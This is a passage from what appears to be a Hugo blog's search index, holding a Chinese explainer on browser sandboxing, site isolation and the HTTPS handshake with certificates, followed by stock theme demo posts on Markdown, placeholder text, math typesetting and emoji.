JavaScript、图片编解码等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。\n基于以上原因，需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。将渲染进程和操作系统隔离的这道墙就是安全沙箱。\n浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。\n安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，而安全沙箱机制能限制进程对操作系统资源的访问和修改，所以无法在单进程浏览器中使用安全沙箱保护机制，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。\n安全沙箱如何影响各个模块功能\n安全沙箱的特点：\n最小的保护单位是进程 能限制进程对操作系统资源的访问和修改 这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。（被安全沙箱保护的进程会有一系列的受限操作）\n所以有些能力就不能在渲染进程中存在，那渲染进程和浏览器内核各自的职责就需要分配好，如下图：\n通过该图，可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉 及到和系统交互的功能都转移到浏览器内核中去实现。\n安全沙箱是如何影响到各个模块功能的？\n持久存储 由于安全沙箱需要负责确保渲染进程无法直接访问用户的文件系统，但是在渲染进程内部有访问 Cookie 的需求、有上传文件 的需求，为了解决这些文件的访问需求，所以现代浏览器将读写文件的操作全部放在了浏览 器内核中实现，然后通过 IPC 将操作结果转发给渲染进程。\n具体地讲，文件内容的读写都是在浏览器内核中完成的：\n存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据 库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取 Cookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进程。\n一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。\n网络访问 渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。\n用户交互 通常情况下，如果你要实现一个 UI 程序，操作系统会提供一个界面给你，该界面允许应用 程序与用户交互，允许应用程序在该界面上进行绘制，比如 Windows 提供的是 HWND， Linux 提供的 X Window，我们就把 HWND 和 X Window 统称为窗口句柄。应用程序可 以在窗口句柄上进行绘制和接收键盘鼠标消息。\n不过在现代浏览器中，由于每个渲染进程都有安全沙箱的保护，所以在渲染进程内部是无法 直接操作窗口句柄的，这也是为了限制渲染进程监控到用户的输入事件。\n由于渲染进程不能直接访问窗口句柄，所以渲染进程需要完成以下两点大的改变。\n第一点，渲染进程需要渲染出位图。为了向用户显示渲染进程渲染出来的位图，渲染进程需 要将生成好的位图发送到浏览器内核，然后浏览器内核将位图复制到屏幕上。\n第二点，操作系统没有将用户输入事件直接传递给渲染进程，而是将这些事件传递给浏览器 内核。然后浏览器内核再根据当前浏览器界面的状态来判断如何调度这些事件，如果当前焦 点位于浏览器地址栏中，则输入事件会在浏览器内核内部处理；如果当前焦点在页面的区域 内，则浏览器内核会将输入事件转发给渲染进程。\n之所以这样设计，就是为了限制渲染进程有监控到用户输入事件的能力，所以所有的键盘鼠 标事件都是由浏览器内核来接收的，然后浏览器内核再通过 IPC 将这些事件发送给渲染进 程。\n站点隔离（Site Isolation） 所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关 联的页面放到同一个渲染进程中执行。\n最开始 Chrome 划分渲染进程是以标签页为单位，也就是说整个标签页会被划分给某个渲 染进程。但是，按照标签页划分渲染进程存在一些问题，原因就是一个标签页中可能包含了 多个 iframe，而这些 iframe 又有可能来自于不同的站点，这就导致了多个不同站点中的内 容通过 iframe 同时运行在同一个渲染进程中。\n目前所有操作系统都面临着两个 A 级漏洞——幽灵（Spectre）和熔毁（Meltdown），这 两个漏洞是由处理器架构导致的，很难修补，黑客通过这两个漏洞可以直接入侵到进程的内 部，如果入侵的进程没有安全沙箱的保护，那么黑客还可以发起对操作系统的攻击。\n所以如果一个银行站点包含了一个恶意 iframe，然后这个恶意的 iframe 利用这两个 A 级 漏洞去入侵渲染进程，那么恶意程序就能读取银行站点渲染进程内的所有内容了，这对于用 户来说就存在很大的风险了。\n因此 Chrome 几年前就开始重构代码，将标签级的渲染进程重构为 iframe 级的渲染进 程，然后严格按照同一站点的策略来分配渲染进程，这就是 Chrome 中的站点隔离。\n实现了站点隔离，就可以将恶意的 iframe 隔离在恶意进程内部，使得它无法继续访问其他 iframe 进程的内容，因此也就无法攻击其他站点了。\n你认为安全沙箱能防止 XSS 或者 CSRF 一类的攻击的吗？为什么？\n安全沙箱是不能防止 XSS 或者 CSRF 一类的攻击，安全沙箱的目的是隔离渲染进程和操作系统，让渲染进行没有访问操作系统的权利 XSS 或者 CSRF 主要是利用网络资源获取用户的信息，这和操作系统没有关系。\n网络安全协议 HTTPS 起初设计 HTTP 协议的目的很单纯，就是为了传输超文本文件，那时候也没有太强的加密传输的数据需求，所以 HTTP 一直保持着明文传输数据的特征。但这样的话，在传输过程中的每一个环节，数据都有可能被窃取或者篡改，这也意味着你和服务器之间还可能有个中间人， 你们在通信过程中的一切内容都在中间人的掌握中，如下图：\n使用 HTTP 传输的内容很容易被中间人窃取、伪造和篡改，通常这种攻击方式称为中间人攻击。\n具体来讲，在将 HTTP 数据提交给 TCP 层之后，数据会经过用户电脑、WiFi 路由器、运营 商和目标服务器，在这中间的每个环节中，数据都有可能被窃取或篡改。比如用户电脑被黑 客安装了恶意软件，那么恶意软件就能抓取和篡改所发出的 HTTP 请求的内容。或者用户 一不小心连接上了 WiFi 钓鱼路由器，那么数据也都能被黑客抓取或篡改。\n在 HTTP 协议栈中引入安全层\n从 HTTP 协议栈层面来看，可以在 TCP 和 HTTP 之间插入一个安全层，所有经过安全 层的数据都会被加密或者解密，你可以参考下图：\nHTTPS 并非是一个新的协议，通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP/IP，因此要搞清楚 HTTPS 是如何工作的，就要弄清楚安全层是怎么工作的。\n安全层有两个主要的职责：对发起 HTTP 请求的数据进行加密操作和对接收到 HTTP 的内容进行解密操作。\n一个从简单到复杂的 HTTPS 协议：\n第一版：使用对称加密\n所谓对称加密是指加密和解密都使用的是相同的密钥。\n要在两台电脑上加解密同一个文件，至少需要知道加解密方式和密钥，因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：\nHTTPS 首先要协商加解密方式，这个过程就是 HTTPS 建立安全连接的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体 过程如下：\n浏览器发送它所支持的加密套件列表和一个随机数 client-random，这里的加密套件是 指加密的方法，加密套件列表就是指浏览器能支持多少种加密方法列表。 服务器会从加密套件列表中选取一个加密套件，然后还会生成一个随机数 servicerandom，并将 service-random 和加密套件列表返回给浏览器。 最后浏览器和服务器分别返回确认消息。 这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。\n通过将对称加密应用在安全层上，我们实现了第一个版本的 HTTPS，虽然这个版本能够很好地工作，但是其中传输 client-random 和 service-random 的过程却是明文的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。\n第二版：使用非对称加密\n和对称加密只有一个密钥不同，非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加 密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来 解密。\n在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥 称为公钥，服务器自己留下的那个密钥称为私钥。顾名思义，公钥是每个人都能获取到的， 而私钥只有服务器才能知道，不对任何人公开。下图是使用非对称加密改造的 HTTPS 协议：\n分析下使用非对称加密的请求流程：\n首先浏览器还是发送加密套件列表给服务器。 然后服务器会选择一个加密套件，不过和对称加密不同的是，使用非对称加密时服务器上需要有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥，由于公钥是给浏览器加密使用的，因此服务器会将加密套件和公钥一道发送给浏览器。 最后就是浏览器和服务器返回确认消息。 这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。\n因此采用非对称加密，就能保证浏览器发送给服务器的数据是安全的了，这看上去似乎很完美，不过这种方式依然存在两个严重的问题。\n第一个是非对称加密的效率太低。这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。 第二个是无法保证服务器发送给浏览器的数据安全。虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。 第三版：对称加密和非对称加密搭配使用\n基于以上两点原因，我们最终选择了一个更加完美的方案，那就是在传输数据阶段依然使用 对称加密，但是对称加密的密钥我们采用非对称加密来传输。下图就是改造后的版本：\n改造后的流程是这样的：\n首先浏览器向服务器发送对称加密套件列表、非对称加密套件列表和随机数 clientrandom； 服务器保存随机数 client-random，选择对称加密和非对称加密的套件，然后生成随机 数 service-random，向浏览器发送选择的加密套件、service-random 和公钥； 浏览器保存公钥，并利用 client-random 和 service-random 计算出来 pre-master， 然后利用公钥对 pre-master 加密，并向服务器发送加密后的数据； 最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。 到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 premaster，然后服务器和浏览器会使用这三组随机数生成对称密钥，因为服务器和浏览器使 用同一套方法来生成密钥，所以最终生成的密钥也是相同的\n有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。\n需要特别注意的一点，pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了。\n第四版：添加数字证书\n通过对称和非对称混合方式，我们完美地实现了数据的加密传输。不过这种方式依然存在着 问题，比如我要打开极客时间的官网，但是黑客通过 DNS 劫持将极客时间官网的 IP 地址 替换成了黑客的 IP 地址，这样我访问的其实是黑客的服务器了，黑客就可以在自己的服务 器上实现公钥和私钥，而对浏览器来说，它完全不知道现在访问的是个黑客的站点。\n所以我们还需要服务器向浏览器提供证明“我就是我”，那怎么证明呢？\n这里我们结合实际生活中的一个例子，比如你要买房子，首先你需要给房管局提交你买房的 材料，包括银行流水、银行证明、身份证等，然后房管局工作人员在验证无误后，会发给你 一本盖了章的房产证，房产证上包含了你的名字、身份证号、房产地址、实际面积、公摊面 积等信息。\n在这个例子中，你之所以能证明房子是你自己的，是因为引进了房管局这个权威机构，并通 过这个权威机构给你颁发一个证书：房产证。\n同理，极客时间要证明这个服务器就是极客时间的，也需要使用权威机构颁发的证书，这个 权威机构称为 CA（Certificate Authority），颁发的证书就称为数字证书（Digital Certificate)。\n对于浏览器来说，数字证书有两个作用：一个是通过数字证书向浏览器证明服务器的身份， 另一个是数字证书里面包含了服务器公钥。\n接下来我们看看含有数字证书的 HTTPS 的请求流程，你可以参考下图：\n相较于第三版的 HTTPS 协议，这里主要有两点改变：\n服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含在数字证书中的； 在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。 通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但 是由于证书是没有办法伪造的，所以依然无法欺骗用户。\n数字证书的申请和验证\n通过上面四个版本的迭代，我们实现了目前的 HTTPS 架构。\n在第四版的 HTTPS 中，我们提到过，有了数字证书，黑客就无法欺骗用户了，不过我们并 没有解释清楚如何通过数字证书来证明用户身份，所以接下来我们再来把这个问题解释清 楚。\n如何申请数字证书\n我们先来看看如何向 CA 申请证书。比如极客时间需要向某个 CA 去申请数字证书，通常的 申请流程分以下几步：\n首先极客时间需要准备一套私钥和公钥，私钥留着自己使用； 然后极客时间向 CA 机构提交公钥、公司、站点等信息并等待认证，这个认证过程可能 是收费的； CA 通过线上、线下等多种渠道来验证极客时间所提供信息的真实性，如公司是否存在、 企业是否合法、域名是否归属该企业等； 如信息审核通过，CA 会向极客时间签发认证的数字证书，包含了极客时间的公钥、组织 信息、CA 的信息、有效时间、证书序列号等，这些信息都是明文的，同时包含一个 CA 生成的签名。 这样我们就完成了极客时间数字证书的申请过程。前面几步都很好理解，不过最后一步数字 签名的过程还需要解释下：首先 CA 使用 Hash 函数来计算极客时间提交的明文信息，并得 出信息摘要；然后 CA 再使用它的私钥对信息摘要进行加密，加密后的密文就是 CA 颁给极 客时间的数字签名。这就相当于房管局在房产证上盖的章，这个章是可以去验证的，同样我 们也可以通过数字签名来验证是否是该 CA 颁发的。\n浏览器如何验证数字证书\n有了 CA 签名过的数字证书，当浏览器向极客时间服务器发出请求时，服务器会返回数字证 书给浏览器。\n浏览器接收到数字证书之后，会对数字证书进行验证。首先浏览器读取证书中相关的明文信 息，采用 CA 签名时相同的 Hash 函数来计算并得到信息摘要 A；然后再利用对应 CA 的公 钥解密签名数据，得到信息摘要 B；对比信息摘要 A 和信息摘要 B，如果一致，则可以确 认证书是合法的，即证明了这个服务器是极客时间的；同时浏览器还会验证证书相关的域名 信息、有效时间等信息。\n这时候相当于验证了 CA 是谁，但是这个 CA 可能比较小众，浏览器不知道该不该信任它， 然后浏览器会继续查找给这个 CA 颁发证书的 CA，再以同样的方式验证它上级 CA 的可靠 性。通常情况下，操作系统中会内置信任的顶级 CA 的证书信息（包含公钥），如果这个 CA 链中没有找到浏览器内置的顶级的 CA，证书也会被判定非法。\n另外，在申请和使用证书的过程中，还需要注意以下三点：\n申请数字证书是不需要提供私钥的，要确保私钥永远只能由服务器掌握； 数字证书最核心的是 CA 使用它的私钥生成的数字签名； 内置 CA 对应的证书称为根证书，根证书是最权威的机构，它们自己为自己签名，我们 把这称为自签名证书。 建议亲手搭建一个 HTTPS 的站点，可以去 freeSSL 申请免费 证书。链接：\n中文：https://freessl.cn/ 英文：https://www.freessl.com/\n总结一下 HTTPS 的握手过程\n习题 答案：abcd\n因为在解析 JavaScript 的时候，div 元素还没有被创建出来，所有 getElementsByTagName 返回的数据是空的。\n","date":"2025-03-12T15:02:09+08:00","image":"http://localhost:1313/blogs/post/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/871_hu_c7ee7146e766d5a5.jpg","permalink":"http://localhost:1313/blogs/post/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","title":"浏览器工作原理"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"http://localhost:1313/blogs/post/markdown-syntax/pawel-czerwinski-8uZPynIu-rQ-unsplash_hu_e95a4276bf860a84.jpg","permalink":"http://localhost:1313/blogs/post/markdown-syntax/","title":"Markdown Syntax Guide"},{"content":"Lorem est tota propiore conpellat pectoribus de pectora summo.\nRedit teque digerit hominumque toris verebor lumina non cervice subde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc caluere tempus inhospita parcite confusaque translucet patri vestro qui optatis lumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\nExierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus silentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria tractus malis.\nComas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et Vagus elidunt The Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra dicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere furit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli Lelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare Echionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert ausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae vulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem Propoetides parte.\n","date":"2019-03-09T00:00:00Z","image":"http://localhost:1313/blogs/post/placeholder-text/matt-le-SJSpo9hQf7s-unsplash_hu_c1ca39d792aee4ab.jpg","permalink":"http://localhost:1313/blogs/post/placeholder-text/","title":"Placeholder Text"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTeX globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTeX on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Inline math: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$\n$$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$","date":"2019-03-08T00:00:00Z","permalink":"http://localhost:1313/blogs/post/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"http://localhost:1313/blogs/post/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_hu_27b8954607cdb515.jpg","permalink":"http://localhost:1313/blogs/post/emoji-support/","title":"Emoji Support"}]